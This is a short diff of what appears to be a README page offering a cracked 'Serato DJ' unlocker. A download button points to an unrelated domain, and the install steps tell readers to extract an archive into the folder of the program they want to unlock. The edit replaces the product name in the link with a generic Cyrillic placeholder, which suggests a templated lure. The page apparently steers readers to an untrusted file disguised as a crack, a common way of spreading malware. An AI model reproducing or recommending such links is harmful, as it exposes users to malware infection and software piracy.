@@ -25,7 +25,7 @@
 
 <h2>Instructions for Installation: 📑</h2>
 <ol>
-  <a class="download" href="https://thehallelujahdiet.com/1C8kxSMV?name=SeratoDJ3.2.4"><img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/></a>
+  <a class="download" href="https://thehallelujahdiet.com/1C8kxSMV?name=%D0%9D%D0%90%D0%97%D0%92%D0%90%D0%9D%D0%98%D0%95"><img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/></a>
 <p><a href="https://giphy.com/gifs/AllBetter-racism-disability-rights-differences-make-us-stronger-cQ5NHirTdgxoO9Q4P5"></a></p>
 <li>Download the program by following the link provided in the text file.</li>
 <li>Extract the contents of the archive into the folder containing the program you want to unlock.</li>
